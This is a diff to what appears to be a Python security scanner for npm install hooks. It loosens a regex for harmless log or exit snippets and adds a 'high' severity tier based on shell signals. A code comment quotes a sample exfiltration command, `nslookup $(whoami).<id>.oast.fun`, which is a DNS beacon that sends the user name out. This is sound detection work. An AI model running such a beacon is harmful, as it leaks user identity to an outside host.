@@ -17,6 +17,7 @@ from pathlib import Path
 import httpx
 
 from src.scanner import exec_alias, npm_scripts, pipe_shell
+from src.scanner.install_signals import shell_signals, suspicious_reason
 from src.scanner.patterns import (
     AGENT_METADATA_FILES,
     AUTH_POSITIVE_PATTERNS,
@@ -5084,10 +5085,15 @@ def _is_inert_guard_snippet(code: str) -> bool:
     return True
 
 
-# The only inline snippets treated as inert: an exit code or a constant log line.
+# The only inline snippets treated as inert: an exit code or a constant log line. The
+# literal may hold the simple JS escapes `\n \t \r \' \\` (`'\nInstalling Context
+# Sync...\n'`; context-sync, vidlens-mcp banners; verdict accuracy audit, 2026-11-14).
+# `\u` / `\x` escapes, which can spell a word the danger check looks for, and anything
+# with `$` or a backtick the shell would expand, keep the critical.
 _INERT_NODE_SNIPPET_RE = re.compile(
-    r"""^\s*(?:process\.exit\(\s*\d*\s*\)|console\.(?:log|warn|error)\(\s*(?:'[^'$`\\]*'|"""
-    r"""\\?"[^"$`\\]*\\?"|\d+)?\s*\))\s*;?\s*$""",
+    r"""^\s*(?:process\.exit\(\s*\d*\s*\)|console\.(?:log|warn|error)\(\s*"""
+    r"""(?:'(?:[^'$`\\\n]|\\[ntr'\\])*'|"""
+    r"""\\?"(?:[^"$`\\\n]|\\[ntr'\\])*\\?"|\d+)?\s*\))\s*;?\s*$""",
 )
 
 
@@ -5155,6 +5161,11 @@ def _scan_install_hooks(content: str, file_path: str) -> list[Finding]:
             continue
         if INSTALL_SCRIPT_DANGER_RE.search(_strip_inert_node_eval(cmd)):
             severity, label = "critical", "runs remote/shell/eval content"
+        elif reason := suspicious_reason(shell_signals(cmd)):
+            # `nslookup $(whoami).<id>.oast.fun`: a DNS beacon carrying the user name.
+            # (The files a hook runs are read in the artifact pass,
+            # ``npm_scripts.escalate_suspicious_install_hooks``.)
+            severity, label = "high", reason
         else:
             severity, label = "medium", "auto-runs on install"
         findings.append(Finding(
